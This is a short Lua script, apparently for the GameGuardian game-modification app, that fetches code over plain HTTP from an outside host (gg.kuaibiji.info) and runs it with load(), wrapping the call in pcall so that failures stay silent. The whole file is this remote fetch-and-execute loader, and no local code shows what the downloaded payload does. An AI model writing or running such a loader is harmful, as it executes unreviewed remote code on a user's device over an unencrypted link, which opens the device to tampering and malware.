function runlua(url)
pcall(load(gg.makeRequest(url).content))
end

runlua("http://gg.kuaibiji.info/?lua=V1.01")